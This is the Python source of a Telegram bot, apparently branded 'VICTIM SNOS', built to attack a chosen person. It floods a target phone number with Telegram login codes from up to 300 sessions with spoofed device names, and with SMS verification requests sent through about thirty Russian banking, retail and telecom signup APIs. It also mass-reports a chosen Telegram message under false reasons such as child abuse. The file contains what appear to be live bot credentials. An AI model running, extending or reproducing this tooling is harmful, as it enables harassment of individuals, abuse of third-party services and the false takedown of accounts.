import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
import re
from datetime import datetime
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
import pyrogram.raw.functions.messages as raw_messages
import pyrogram.raw.types as raw_types

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"

SESSIONS_PER_USER = 300
SESSION_DELAY = 60
SMS_PER_ROUND = 8
ROUND_DELAY = 10
BOMBER_DELAY = 3
SITE_DELAY = 15
SMS_DELAY = 5

MAILTM_ACCOUNTS_COUNT = 30
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
BANNER_PATH = "banner.png"

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
]

DEVICES = [
    {"model": "iPhone 15 Pro", "system": "iOS 17.0"},
    {"model": "iPhone 14 Pro Max", "system": "iOS 16.5"},
    {"model": "iPhone 13", "system": "iOS 15.7"},
    {"model": "iPhone 12", "system": "iOS 14.8"},
    {"model": "iPhone 11", "system": "iOS 13.6"},
    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
    {"model": "Samsung Galaxy S23", "system": "Android 13"},
    {"model": "Samsung Galaxy S22", "system": "Android 12"},
    {"model": "Google Pixel 8 Pro", "system": "Android 14"},
    {"model": "Google Pixel 7", "system": "Android 13"},
    {"model": "Xiaomi 14 Pro", "system": "Android 14"},
    {"model": "Xiaomi 13", "system": "Android 13"},
    {"model": "OnePlus 12", "system": "Android 14"},
    {"model": "OnePlus 11", "system": "Android 13"},
    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
    {"model": "iPad Pro", "system": "iOS 17.0"},
    {"model": "MacBook Pro", "system": "macOS 14.0"},
]

# Сайты с OAuth и Telegram авторизацией
TELEGRAM_OAUTH_SITES = [
    {"url": "https://oauth.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "Telegram OAuth"},
    {"url": "https://oauth.telegram.org/auth/request", "method": "POST", "phone_field": "phone", "name": "OAuth Request"},
    {"url": "https://acollo.ru/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Acollo"},
    {"url": "https://acollo.ru/api/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Acollo API"},
    {"url": "https://fragment.com/auth", "method": "POST", "phone_field": "phone", "name": "Fragment"},
    {"url": "https://fragment.com/api/auth", "method": "POST", "phone_field": "phone", "name": "Fragment API"},
    {"url": "https://wallet.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "Wallet"},
    {"url": "https://passport.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "Passport"},
    {"url": "https://my.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
    {"url": "https://web.telegram.org/k/auth", "method": "POST", "phone_field": "phone", "name": "WebK"},
    {"url": "https://web.telegram.org/a/auth", "method": "POST", "phone_field": "phone", "name": "WebA"},
    {"url": "https://getgems.io/auth/telegram", "method": "POST", "phone_field": "phone", "name": "GetGems"},
    {"url": "https://tonkeeper.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Tonkeeper"},
    {"url": "https://tonhub.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Tonhub"},
    {"url": "https://hamsterkombat.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "HamsterKombat"},
    {"url": "https://notcoin.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Notcoin"},
    {"url": "https://tapswap.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "TapSwap"},
    {"url": "https://blum.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Blum"},
    {"url": "https://yescoin.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Yescoin"},
    {"url": "https://bybit.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bybit"},
    {"url": "https://htx.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "HTX"},
    {"url": "https://gate.io/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Gate"},
    {"url": "https://kucoin.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "KuCoin"},
    {"url": "https://mexc.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "MEXC"},
    {"url": "https://bitget.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bitget"},
]

BOMBER_WEBSITES = [
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone", "name": "VK"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone", "name": "OK.ru"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone", "name": "Yandex"},
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Magnit"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Pyaterochka"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AlfaBank"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone", "name": "Avito"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Citilink"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone", "name": "MVideo"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "DNS"},
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Beeline"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone", "name": "Megafon"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2"},
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone", "name": "Gosuslugi"},
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone", "name": "RZD"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Aeroflot"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
]

# Типы жалоб для Telegram
REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = set()
user_sessions = {}
active_attacks = {}
active_bombers = {}
active_reports = {}
sessions_creation_lock = {}
usage_logs = []
MAX_LOGS = 20
site_last_used = {}
session_site_usage = {}

class SnosState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ReportMessageState(StatesGroup):
    waiting_link = State()
    waiting_reason = State()

class AdminState(StatesGroup):
    waiting_user_id = State()


def add_log(user_id: int, action: str, target: str):
    global usage_logs
    usage_logs.append({
        "user_id": user_id,
        "action": action,
        "target": target,
        "time": datetime.now().strftime('%H:%M:%S')
    })
    if len(usage_logs) > MAX_LOGS:
        usage_logs = usage_logs[-MAX_LOGS:]

def get_last_logs(count: int = 5) -> str:
    if not usage_logs:
        return "Empty"
    logs = usage_logs[-count:]
    lines = []
    for log in reversed(logs):
        lines.append(f"[{log['time']}] {log['user_id']} - {log['action']}: {log['target']}")
    return "\n".join(lines)

def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            data = json.load(f)
            ALLOWED_USERS = set(data.get("users", []))
    except:
        ALLOWED_USERS = set()

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(ALLOWED_USERS)}, f)

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def is_user_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ALLOWED_USERS

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID:
                return await handler(event, data)
            else:
                await send_message_with_banner(event, "Admin only!")
                return

        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery):
                await event.answer("No access!", show_alert=True)
            elif isinstance(event, types.Message):
                await send_message_with_banner(event, "No access!")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- СЕССИИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"

def count_user_sessions_files(user_id: int) -> int:
    session_dir = get_user_session_dir(user_id)
    if not os.path.exists(session_dir):
        return 0
    
    count = 0
    for f in os.listdir(session_dir):
        if f.startswith("session_") and f.endswith(".session"):
            count += 1
    return count

async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        device = random.choice(DEVICES)
        client = Client(
            session_file, 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=False, 
            no_updates=True,
            device_model=device["model"],
            system_version=device["system"]
        )
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0, "device": device["model"]}
    except:
        return None

async def create_user_sessions(user_id: int) -> tuple:
    session_dir = get_user_session_dir(user_id)
    os.makedirs(session_dir, exist_ok=True)
    
    existing_count = count_user_sessions_files(user_id)
    
    if existing_count >= SESSIONS_PER_USER:
        return [], existing_count
    
    sessions = []
    for i in range(existing_count):
        session_file = f"{session_dir}/session_{i}"
        if os.path.exists(f"{session_file}.session"):
            sess = await create_single_session(session_file, i)
            if sess:
                sessions.append(sess)
    
    need_to_create = SESSIONS_PER_USER - len(sessions)
    if need_to_create > 0:
        batch_size = 10
        for batch_start in range(len(sessions), SESSIONS_PER_USER, batch_size):
            batch_end = min(batch_start + batch_size, SESSIONS_PER_USER)
            tasks = []
            
            for i in range(batch_start, batch_end):
                session_file = f"{session_dir}/session_{i}"
                if not os.path.exists(f"{session_file}.session"):
                    tasks.append(create_single_session(session_file, i))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if r and not isinstance(r, Exception):
                        sessions.append(r)
            
            await asyncio.sleep(2)
    
    return sessions, len(sessions)

async def ensure_user_sessions(user_id: int):
    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]:
        return
    
    sessions_creation_lock[user_id] = True
    
    try:
        if user_id not in user_sessions:
            user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
        
        sessions, total = await create_user_sessions(user_id)
        user_sessions[user_id]["sessions"] = sessions
        user_sessions[user_id]["total"] = total
        user_sessions[user_id]["ready"] = True
    finally:
        sessions_creation_lock[user_id] = False

async def refresh_user_sessions(user_id: int):
    if user_id in user_sessions:
        old_data = user_sessions[user_id]
        for s in old_data.get("sessions", []):
            try:
                await s["client"].disconnect()
            except:
                pass
    
    session_dir = get_user_session_dir(user_id)
    if os.path.exists(session_dir):
        shutil.rmtree(session_dir)
    
    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
    await ensure_user_sessions(user_id)

async def get_user_sessions_batch(user_id: int, count: int, exclude_used_for_site: str = None) -> list:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
        return []
    
    current_time = time.time()
    available = []
    
    for s in user_sessions[user_id]["sessions"]:
        if not s["in_use"] and s["flood_until"] < current_time:
            if current_time - s["last_used"] >= SESSION_DELAY:
                # Умная фильтрация - не используем сессию которая уже была на этом сайте
                if exclude_used_for_site:
                    session_key = f"{user_id}_{s['index']}"
                    if session_key in session_site_usage:
                        if exclude_used_for_site in session_site_usage[session_key]:
                            continue
                available.append(s)
    
    available.sort(key=lambda x: x["last_used"])
    selected = available[:count]
    
    for s in selected:
        s["in_use"] = True
        s["last_used"] = current_time
    
    return selected

def release_user_sessions(sessions: list):
    for s in sessions:
        if s:
            s["in_use"] = False

def mark_session_used_for_site(user_id: int, session_idx: int, site_name: str):
    session_key = f"{user_id}_{session_idx}"
    if session_key not in session_site_usage:
        session_site_usage[session_key] = set()
    session_site_usage[session_key].add(site_name)

def get_user_sessions_count(user_id: int) -> int:
    if user_id in user_sessions:
        return user_sessions[user_id].get("total", 0)
    return 0

def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id].get("ready", False)


# ---------- СНОС НОМЕРА ----------
async def send_sms_safe(session_data: dict, phone: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False, "flood": e.value}
    except Exception as e:
        return {"type": "SMS", "success": False, "error": str(e)[:30]}

async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict, session_idx: int, user_id: int) -> dict:
    global site_last_used
    
    site_name = site["name"]
    current_time = time.time()
    
    # Задержка между запросами к одному сайту
    if site_name in site_last_used:
        time_since_last = current_time - site_last_used[site_name]
        if time_since_last < SITE_DELAY:
            await asyncio.sleep(SITE_DELAY - time_since_last)
    
    site_last_used[site_name] = current_time
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': site["url"].split('/')[2],
    }
    payload = {site["phone_field"]: phone}
    
    try:
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=payload, timeout=10, ssl=False) as resp:
                mark_session_used_for_site(user_id, session_idx, site_name)
                return {"site": site["name"], "success": True}
        else:
            async with session.get(site["url"], headers=headers, params=payload, timeout=10, ssl=False) as resp:
                mark_session_used_for_site(user_id, session_idx, site_name)
                return {"site": site["name"], "success": True}
    except:
        return {"site": site["name"], "success": False}

async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    results = []
    ok, err = 0, 0
    phone = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    add_log(user_id, "Snos", phone)
    
    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
            
            if not sessions:
                await asyncio.sleep(2)
                continue
            
            tasks = []
            
            # SMS
            for sess in sessions:
                tasks.append(send_sms_safe(sess, phone))
                await asyncio.sleep(SMS_DELAY / 1000)
            
            # OAuth запросы - умное распределение
            for sess in sessions:
                # Выбираем сайты на которых эта сессия еще не была
                available_sites = []
                for site in TELEGRAM_OAUTH_SITES:
                    session_key = f"{user_id}_{sess['index']}"
                    if session_key not in session_site_usage or site["name"] not in session_site_usage[session_key]:
                        available_sites.append(site)
                
                # Если все сайты использованы, берем случайные
                if not available_sites:
                    available_sites = random.sample(TELEGRAM_OAUTH_SITES, min(3, len(TELEGRAM_OAUTH_SITES)))
                
                for site in available_sites[:3]:
                    tasks.append(send_oauth_request(sess, phone, site, sess["index"], user_id))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_user_sessions(sessions)
            
            round_ok = 0
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get("success"):
                        ok += 1
                        round_ok += 1
                    else:
                        err += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(ROUND_DELAY)
    
    # Очищаем номер из логов
    return results, ok


# ---------- БОМБЕР ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    payload = {site["phone_field"]: phone}
    try:
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=payload, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": True}
        else:
            async with session.get(site["url"], headers=headers, params=payload, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": True}
    except:
        return {"site": site["name"], "success": False}

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    results, ok = [], 0
    add_log(user_id, "Bomber", phone)
    
    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = [send_bomber_request(sess, phone, site) for site in BOMBER_WEBSITES]
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            round_ok = 0
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get("success"):
                        ok += 1
                        round_ok += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(BOMBER_DELAY)
    
    return results, ok


# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ ЧЕРЕЗ TELEGRAM ----------
REPORT_REASONS_LIST = list(REPORT_REASONS.keys())

async def report_message_via_session(session_data: dict, channel_username: str, message_id: int, reason: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        chat = await client.get_chat(f"@{channel_username}")
        message = await client.get_messages(chat.id, message_id)
        
        if not message:
            return {"success": False, "error": "not_found"}
        
        reason_obj = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
        
        await client.invoke(
            raw_messages.Report(
                peer=await client.resolve_peer(chat.id),
                id=[message_id],
                reason=reason_obj
            )
        )
        
        return {"success": True, "chat": channel_username, "msg_id": message_id}
        
    except Exception as e:
        return {"success": False, "error": str(e)[:30]}

async def mass_report_message(user_id: int, message_link: str, reason: str, progress_callback=None) -> tuple:
    pattern = r't\.me/([^/]+)/(\d+)'
    match = re.search(pattern, message_link)
    
    if not match:
        return 0, "invalid_link"
    
    channel_username = match.group(1)
    message_id = int(match.group(2))
    
    add_log(user_id, f"Report({reason})", f"@{channel_username}/{message_id}")
    
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
        return 0, "sessions_not_ready"
    
    sessions = await get_user_sessions_batch(user_id, 30)
    
    if not sessions:
        return 0, "no_sessions"
    
    ok = 0
    
    for sess in sessions:
        result = await report_message_via_session(sess, channel_username, message_id, reason)
        if result.get("success"):
            ok += 1
        
        if progress_callback:
            await progress_callback(ok)
        
        await asyncio.sleep(1.5)
    
    release_user_sessions(sessions)
    
    # Очищаем ссылку из памяти
    return ok, None


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="SNOS", callback_data="snos_menu")
    builder.button(text="BOMBER", callback_data="bomber_menu")
    builder.button(text="REPORT", callback_data="report_menu")
    builder.button(text="ADMIN", callback_data="admin_menu")
    builder.button(text="STATUS", callback_data="status")
    builder.button(text="STOP", callback_data="stop")
    builder.adjust(2, 2, 2)
    return builder.as_markup()

def get_snos_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="SNOS NUMBER", callback_data="snos")
    builder.button(text="REFRESH", callback_data="refresh_sessions")
    builder.button(text="BACK", callback_data="main_menu")
    builder.adjust(2, 1)
    return builder.as_markup()

def get_bomber_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="BOMBER", callback_data="bomber")
    builder.button(text="BACK", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="REPORT MESSAGE", callback_data="report_msg")
    builder.button(text="BACK", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_reason_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="Spam", callback_data="reason_spam")
    builder.button(text="Violence", callback_data="reason_violence")
    builder.button(text="Pornography", callback_data="reason_pornography")
    builder.button(text="Child Abuse", callback_data="reason_child_abuse")
    builder.button(text="Copyright", callback_data="reason_copyright")
    builder.button(text="Personal Data", callback_data="reason_personal_data")
    builder.button(text="Illegal Drugs", callback_data="reason_illegal_drugs")
    builder.button(text="Other", callback_data="reason_other")
    builder.button(text="BACK", callback_data="report_menu")
    builder.adjust(2, 2, 2, 2, 1)
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ADD", callback_data="admin_add")
    builder.button(text="REMOVE", callback_data="admin_remove")
    builder.button(text="LIST", callback_data="admin_list")
    builder.button(text="LOGS", callback_data="admin_logs")
    builder.button(text="BACK", callback_data="main_menu")
    builder.adjust(2, 2, 1)
    return builder.as_markup()

async def send_message_with_banner(event: types.Message, text: str, markup=None):
    if os.path.exists(BANNER_PATH):
        return await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        return await event.answer(text, reply_markup=markup)

async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
    await callback.message.delete()
    if os.path.exists(BANNER_PATH):
        await callback.message.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        await callback.message.answer(text, reply_markup=markup)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(
            msg,
            f"<b>SUBSCRIBE FIRST</b>\n\n{CHANNEL_URL}"
        )
        return
    
    if not is_user_allowed(user_id):
        await send_message_with_banner(msg, f"<b>ACCESS DENIED</b>\n\nID: <code>{user_id}</code>")
        return
    
    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
        asyncio.create_task(ensure_user_sessions(user_id))
    
    sessions_count = get_user_sessions_count(user_id)
    sessions_ready = is_user_sessions_ready(user_id)
    
    await send_message_with_banner(
        msg,
        f"<b>VICTIM SNOS</b>\n\n"
        f"Sessions: {sessions_count}/{SESSIONS_PER_USER} {'[READY]' if sessions_ready else '[LOADING]'}\n"
        f"OAuth sites: {len(TELEGRAM_OAUTH_SITES)}\n"
        f"Bomber sites: {len(BOMBER_WEBSITES)}",
        get_main_menu()
    )

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await send_message_with_banner(msg, f"<b>ADMIN</b>\n\nAllowed: {len(ALLOWED_USERS)}", get_admin_menu())

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "<b>SNOS</b>", get_snos_menu())
    await cb.answer()

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "<b>BOMBER</b>", get_bomber_menu())
    await cb.answer()

@dp.callback_query(F.data == "report_menu")
async def report_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "<b>REPORT</b>", get_report_menu())
    await cb.answer()

@dp.callback_query(F.data == "admin_menu")
async def admin_menu_handler(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("No access!", show_alert=True)
        return
    await edit_message_with_banner(cb, f"<b>ADMIN</b>\n\nAllowed: {len(ALLOWED_USERS)}", get_admin_menu())
    await cb.answer()

@dp.callback_query(F.data == "admin_logs")
async def admin_logs(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("No access!", show_alert=True)
        return
    logs_text = get_last_logs(5)
    await edit_message_with_banner(
        cb,
        f"<b>LOGS</b>\n\n{logs_text}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="admin_menu")]])
    )
    await cb.answer()

@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption="<b>ADD USER</b>\n\nEnter ID:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_menu")]])
        )
    else:
        await cb.message.answer(
            "<b>ADD USER</b>\n\nEnter ID:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_menu")]])
        )

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_process(msg: types.Message, state: FSMContext):
    try:
        user_id = int(msg.text.strip())
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        await send_message_with_banner(msg, f"User <code>{user_id}</code> added!")
    except:
        await send_message_with_banner(msg, "Invalid ID!")
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS:
        return
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS)[:20]:
        builder.button(text=f"Remove {uid}", callback_data=f"remove_{uid}")
    builder.button(text="BACK", callback_data="admin_menu")
    builder.adjust(1)
    await edit_message_with_banner(cb, "<b>REMOVE USER</b>", builder.as_markup())

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    user_id = int(cb.data.replace("remove_", ""))
    if user_id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user_id)
        save_allowed_users()
    await edit_message_with_banner(cb, f"User <code>{user_id}</code> removed!", get_admin_menu())

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    text = "<b>ALLOWED</b>\n\n" + "\n".join(f"<code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Empty"
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="admin_menu")]]))

@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = cb.from_user.id
    await edit_message_with_banner(cb, f"<b>VICTIM SNOS</b>\n\nID: <code>{user_id}</code>", get_main_menu())

